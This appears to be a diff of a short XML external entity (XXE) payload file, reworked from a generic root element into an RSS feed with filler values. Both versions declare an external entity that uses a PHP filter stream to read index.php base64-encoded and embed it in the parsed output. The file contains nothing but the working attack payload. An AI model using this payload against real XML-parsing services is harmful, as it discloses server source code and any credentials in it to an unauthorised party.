@@ -1,7 +1,9 @@
-<?xml  version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE root [
-   <!ELEMENT foo ANY >
+<?xml  version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+   <!ELEMENT title ANY >
    <!ENTITY xxe SYSTEM  "php://filter/convert.base64-encode/resource=index.php" >]>
-<root>
-   <foo>&xxe;</foo>
-</root>
+<rss>
+   <title>&xxe;</title>
+   <description>toto</description>
+   <author>toototo</author>
+</rss>
